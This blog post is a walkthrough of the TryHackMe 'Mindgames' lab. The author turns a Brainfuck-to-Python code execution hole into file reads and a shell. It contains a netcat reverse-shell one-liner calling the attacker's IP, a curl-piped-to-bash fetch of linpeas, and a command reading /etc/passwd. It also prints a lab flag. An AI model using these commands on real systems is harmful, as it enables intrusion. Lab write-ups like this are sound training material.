---
layout: post
title:  "THM - Mindgames"
date:   2020-07-03 18:00:00 +1000
category: hacking
---

## WARNING
This post contains rude words, and it's not my fault. Turn back now.

## Introduction
*No hints. Hack it. Don't give up if you get stuck, enumerate harder.*  

This machine is ranked hard, we'll see if I'm up to it...

## Ports
nmap says we've got 22 (FTP) and 80 (HTTP) only - so far so good, right?  
From the ttl (time-to-live) in nmap, we can guess it's a Linux box. nmap says it's running a Golang HTTP server, so that's a little different. Let's check it out.

## Webserver
*Sometimes, people have bad ideas.*
*Sometimes those bad ideas get turned into a CTF box.*
*I'm so sorry.*

*Ever thought that programming was a little too easy? Well, I have just the product for you. Look at the example code below, then give it a go yourself!*

*Like it? Purchase a license today for the low, low price of 0.009BTC/yr!*  

*Hello, World*

``
+[------->++<]>++.++.---------.+++++.++++++.+[--->+<]>+.------.++[->++<]>.-[->+++++<]>++.+++++++..+++.[->+++++<]>+.------------.---[->+++<]>.-[--->+<]>---.+++.------.--------.-[--->+<]>+.+++++++.>++++++++++.
``

Recognise this? It's something called Brainfuck. Yes, that's a thing. And on the website is a spot to submit your own code.

When we do trial some bf code, we can note that when we have an error, it looks like this:  

*Traceback (most recent call last):File "<string>", line 1, in <module>NameError: name*  

That's a python error, so we can guess that the bf code is being interpreted and run by python on the server. So perhaps we can make some valid python code, in brainfuck? 

## Python
We can install a brainfuck generator - also written in python - called [pybf](https://github.com/amrali/pybf) with pip, and then use it to generate code like this:

``
root@kali:/opt/tryhackme/mindgames# echo "import os;os.system('cat /etc/passwd')" | pybf -g -
``

Which gives this:
``
++++++++[>>++>++++>++++++>++++++++>++++++++++>++++++++++++>++++++++++++++>++++++++++++++++>++++++++++++++++++>++++++++++++++++++++>++++++++++++++++++++++>++++++++++++++++++++++++>++++++++++++++++++++++++++>++++++++++++++++++++++++++++>++++++++++++++++++++++++++++++<<<<<<<<<<<<<<<<-]>>>>>>>>-------.++++.+++.-.+++.++.<<<<<.>>>>>-----.++++.<<<-----.>>>----.++++.<<<<--.>>>>.++++++.------.+.<+++++.>-------.<<<<------.-.>>>--.--.>+++++++.<<<<<.>++++++++.>>>++++.>.<--.<<<.>>>>----.<--.>+++..++++.<+++.<<<<+++++++.++.<------.
``

And feeding that to the website gives this:
>root:x:0:0:root:/root:/bin/bash  
etc  
tryhackme:x:1000:1000:tryhackme:/home/tryhackme:/bin/bash  
mindgames:x:1001:1001:,,,:/home/mindgames:/bin/bash  

And in the same manner, we can get a reverse shell:

``
root@kali:/opt/tryhackme/mindgames# echo "import os;os.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.10.123 1234 >/tmp/f')" | pybf -g -
``

I won't put the brainfuck output here, because hopefully you get the idea.

## Shell

And once we've got a shell, we can get the user flag:

>$ python3 -c 'import pty;pty.spawn("/bin/bash");'  
mindgames@mindgames:~/webserver$ cat /home/mindgames/user.txt  
cat /home/mindgames/user.txt  
thm{411f7d38247ff441ce4e134b459b6268}  

Then run linpeas:  

``
mindgames@mindgames:/dev/shm$ curl http://10.9.10.123:8000/linpeas.sh | /bin/bash
``

and ... more or less draw a blank.

## Failed Privesc

So this box used a custom webserver running under *server.service* and I thought maybe I could use that; either the binary might have some hardcoded credentials in it (spoiler: not that I could find), or perhaps I could try replacing the binary with something of my own?

We don't have the sudo password for the account - and I couldn't find it anywhere - so we can't use **systemctl restart** on the service (this requires sudo). However, we can do this:

1. Delete or rename the existing server binary
2. Make a new file to replace the binary - in my case I tried a bash script to start a reverse shell
3. kill -9 [PID] on the the service PID
4. wait for the service to restart and get our shell

Now I think this would help if the service was running as a more privileged user, but unfortunately it was only running as the same user we already had. And, it's pretty drastic since it kills the webserver, so you wouldn't do this unless you were desperate. It does get you a shell though, but it's no better than what we already had.

## Admit defeat

At this point, and after lots of enumeration, I admitted defeat and went and checked a write-up. Turns out the privesc requires a technique I hadn't seen before involving OpenSSL Engine and setting the SUID. Here's an explanation in another [writeup](https://hellrider9.github.io/writeup/mindgames/).

## Final thoughts

I'm relatively new at this; I don't know everything already, and that's okay. I cruised through the foothold pretty easily and got dead-ended on the privesc. That happens sometimes - the key is to learn something from the experience and keep practicing.
